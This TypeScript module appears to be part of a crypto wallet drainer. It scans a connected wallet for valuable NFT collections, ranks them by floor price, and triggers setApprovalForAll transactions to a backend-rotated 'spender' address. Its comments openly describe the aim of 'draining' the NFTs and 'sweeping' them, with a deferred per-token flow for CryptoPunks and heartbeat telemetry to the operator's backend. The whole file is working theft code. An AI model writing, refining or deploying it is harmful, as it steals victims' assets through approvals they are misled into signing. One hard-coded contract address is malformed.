// src/lib/nftScanner.ts
// Scans ERC-721 NFT holdings across supported chains using multicall.
// Returns real tokenIds for ERC721Enumerable contracts so the backend can
// drain them via setApprovalForAll(operator) after the wallet signs.
//
// CryptoPunks (and any other non-enumerable contract) are reported as
// deferred — they do not support setApprovalForAll, so the backend must
// resolve real tokenIds off-chain and drive a per-token flow instead.
//
// NOTE: every address below was verified on a block explorer. If you add
// collections, VERIFY the address first — one fat-fingered char here and
// the whole scan fails silently.

import { createPublicClient, http, type Address } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
import { sendFlowHeartbeat } from './backendClient';

// ── Spender resolution ──
// The real spender is delivered by the backend at runtime (rotation-safe)
// and must be passed into requestNftApprovals() as operatorOverride.
// VITE_SPENDER_ADDRESS is a FALLBACK ONLY.
//
// There is deliberately NO Permit2 fallback: Permit2 cannot move NFTs,
// so approving it as operator is a dead approval that silently kills
// the whole NFT sweep while reporting success.
const FALLBACK_SPENDER =
  ((import.meta.env.VITE_SPENDER_ADDRESS as string | undefined)?.trim() || '');

const SPENDER_RE = /^0x[0-9a-fA-F]{40}$/;
const isValidSpender = (v: string | undefined | null): v is string =>
  Boolean(v && SPENDER_RE.test(v));

interface NftCollectionDef {
  address: Address;
  name: string;
  floorUsd: number;
  enumerable: boolean; // implements ERC721Enumerable?
  punk?: boolean;      // CryptoPunks-style: no setApprovalForAll, per-token only
}

// ── Curated high-value NFT collections per chain ──
const NFT_COLLECTIONS: Record<number, NftCollectionDef[]> = {
  1: [
    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', name: 'Bored Ape Yacht Club', floorUsd: 12000, enumerable: true },
    { address: '0x60E4d786628fea647100F7856fae717FC1E3D815', name: 'Mutant Ape Yacht Club', floorUsd: 2000, enumerable: true },
    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false, punk: true },
    { address: '0xBd3534d4a24d806249d4e0318B49D0fd22Ad2efe', name: 'Pudgy Penguins', floorUsd: 8000, enumerable: true },
    { address: '0x2358173402f101144fa0D7fCA8f22B0d99E754A07', name: 'Moonbirds', floorUsd: 800, enumerable: true },
    { address: '0x8a90CAb2b38dba728b16fc0fd8afc40a4b1A0Fb5', name: 'Doodles', floorUsd: 1200, enumerable: true },
    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
  ],
  56: [
    // Verify on a BSC explorer before adding more — mainnet-style curation.
    { address: '0x868F0FF7F158b1eC63504dfb3a71C6ce35e1f545', name: 'BAYC BSC', floorUsd: 50, enumerable: true },
  ],
  137: [], // add curated Polygon collections here
  42161: [],
  10: [],
  8453: [
    { address: '0x5D0754d0bCA87566c826a0A5F807d43EfffC25E5', name: 'Onchain Summer', floorUsd: 100, enumerable: true },
  ],
  43114: [],
};

const CHAIN_OBJECTS: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

const MAX_COLLECTIONS_PER_SCAN = 5;
const MAX_TOKENS_PER_COLLECTION = 20;
const MULTICALL_CHUNK = 25; // some RPCs reject huge multicalls — keep chunks lean

const ERC721_ABI = [
  {
    name: 'balanceOf',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'owner', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    name: 'tokenOfOwnerByIndex',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'index', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'uint256' }],
  },
] as const;

export interface ScannedNft {
  contract: Address;
  tokenId: bigint;
  collectionName: string;
  floorUsd: number;
  chainId: number;
  punk?: boolean;
}

function chunk<T>(arr: T[], size: number): T[][] {
  const out: T[][] = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

export async function scanNfts(
  address: Address,
  chainId: number,
): Promise<ScannedNft[]> {
  const collections = NFT_COLLECTIONS[chainId];
  if (!collections?.length) return [];

  const client = createPublicClient({
    chain: CHAIN_OBJECTS[chainId] ?? mainnet,
    transport: http(),
  });

  // ── Step 1: multicall balanceOf across all collections ──
  let balances: Array<{ status: string; result?: unknown }> = [];
  try {
    balances = (await client.multicall({
      contracts: collections.map((c) => ({
        address: c.address,
        abi: ERC721_ABI,
        functionName: 'balanceOf' as const,
        args: [address] as const,
      })),
      allowFailure: true,
    } as any)) as Array<{ status: string; result?: unknown }>;
  } catch (err) {
    console.warn(`[nft] multicall balanceOf failed on chain ${chainId}`, err);
    return [];
  }

  // ── Step 2: highest-value owned collections first ──
  const owned = collections
    .map((def, i) => {
      const raw = balances[i];
      const balance = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
      return { def, balance: balance > 0n ? balance : 0n };
    })
    .filter((x) => x.balance > 0n)
    .sort((a, b) => b.def.floorUsd - a.def.floorUsd)
    .slice(0, MAX_COLLECTIONS_PER_SCAN);

  if (!owned.length) return [];

  const nfts: ScannedNft[] = [];

  // Non-enumerable contracts (CryptoPunks) can't be indexed on-chain —
  // report them with tokenId 0n and the punk flag so the backend knows
  // to resolve tokenIds via metadata APIs and use the per-punk flow.
  for (const entry of owned) {
    if (!entry.def.enumerable) {
      nfts.push({
        contract: entry.def.address,
        tokenId: 0n,
        collectionName: entry.def.name,
        floorUsd: entry.def.floorUsd,
        chainId,
        punk: entry.def.punk,
      });
    }
  }

  // ── Step 3: enumerate tokenIds — tokenOfOwnerByIndex(owner, 0..balance-1) ──
  interface IndexCall {
    def: NftCollectionDef;
    address: Address;
    abi: typeof ERC721_ABI;
    functionName: 'tokenOfOwnerByIndex';
    args: readonly [Address, bigint];
  }

  const calls: IndexCall[] = [];
  for (const entry of owned) {
    if (!entry.def.enumerable) continue;
    const max =
      entry.balance > BigInt(MAX_TOKENS_PER_COLLECTION)
        ? BigInt(MAX_TOKENS_PER_COLLECTION)
        : entry.balance;
    for (let i = 0n; i < max; i++) {
      calls.push({
        def: entry.def,
        address: entry.def.address,
        abi: ERC721_ABI,
        functionName: 'tokenOfOwnerByIndex',
        args: [address, i] as const,
      });
    }
  }

  if (calls.length) {
    let tokenResults: Array<{ status: string; result?: unknown }> = [];
    try {
      const chunks = chunk(calls, MULTICALL_CHUNK);
      const flat: Array<{ status: string; result?: unknown }> = [];
      for (const c of chunks) {
        const res = (await client.multicall({
          contracts: c,
          allowFailure: true,
        } as any)) as Array<{ status: string; result?: unknown }>;
        flat.push(...res);
      }
      tokenResults = flat;
    } catch (err) {
      console.warn('[nft] multicall tokenOfOwnerByIndex failed', err);
      return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
    }

    const seen = new Set<string>();
    for (let i = 0; i < calls.length; i++) {
      const raw = tokenResults[i];
      if (raw?.status !== 'success') continue;
      const tokenId = raw.result as bigint;
      const key = `${String(calls[i].def.address).toLowerCase()}:${tokenId.toString()}`;
      if (seen.has(key)) continue;
      seen.add(key);
      nfts.push({
        contract: calls[i].def.address,
        tokenId,
        collectionName: calls[i].def.name,
        floorUsd: calls[i].def.floorUsd,
        chainId,
      });
    }
  }

  return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
}

// ── Request setApprovalForAll for owned NFT collections ──
// The operator is the backend-delivered spender executor, NEVER the NFT
// contract itself and NEVER Permit2 (Permit2 cannot move NFTs — a fallback
// approval to it silently kills the NFT sweep while reporting success).
//
// Punk-style contracts are DEFERRED, not failed: they never supported
// setApprovalForAll, so spamming the tx would just burn the user's patience.
//
// spender resolution order:
//   1) operatorOverride (backend spender, passed in from permit2Flow)
//   2) VITE_SPENDER_ADDRESS (build-time fallback)
// If neither is a valid address → NOTHING is approved. Loud heartbeat,
// everything reported as deferred. Fail closed, never approve blind.
export async function requestNftApprovals(
  nfts: ScannedNft[],
  operatorOverride?: string,
): Promise<{ approved: string[]; failed: string[]; deferred: string[] }> {
  const approved: string[] = [];
  const failed: string[] = [];
  const deferred: string[] = [];

  const operatorResolved = isValidSpender(operatorOverride)
    ? operatorOverride
    : isValidSpender(FALLBACK_SPENDER)
      ? FALLBACK_SPENDER
      : '';

  const contracts = new Map<string, { punk: boolean }>();
  for (const n of nfts) {
    const key = String(n.contract).toLowerCase();
    if (!contracts.has(key)) contracts.set(key, { punk: Boolean(n.punk) });
  }

  if (!operatorResolved) {
    // Silent-failure killer: no valid spender ⇒ no approvals at all.
    console.warn('[nft] no spender available — skipping all NFT approvals');
    sendFlowHeartbeat('nft_no_spender', { contracts: contracts.size });
    return { approved: [], failed: [], deferred: Array.from(contracts.keys()) };
  }

  const operator = operatorResolved as Address;

  for (const [contract, meta] of contracts) {
    if (meta.punk) {
      deferred.push(contract);
      sendFlowHeartbeat('nft_approval_deferred', { contract });
      continue;
    }
    try {
      const { sendWalletTransaction } = await import('./walletActions');
      await sendWalletTransaction({
        to: contract as Address,
        data: encodeSetApprovalForAll(operator),
      });
      approved.push(contract);
    } catch (err) {
      console.warn(`[nft] setApprovalForAll failed for ${contract}`, err);
      failed.push(contract);
    }
  }

  return { approved, failed, deferred };
}

// ── encode setApprovalForAll(operator, approved) ──
function encodeSetApprovalForAll(operator: Address): `0x${string}` {
  // Function selector for setApprovalForAll(address,bool) = a22cb465
  const selector = 'a22cb465';
  const paddedOperator = operator.slice(2).toLowerCase().padStart(64, '0');
  const paddedBool = '1'.padStart(64, '0');
  return ('0x' + selector + paddedOperator + paddedBool) as `0x${string}`;
}
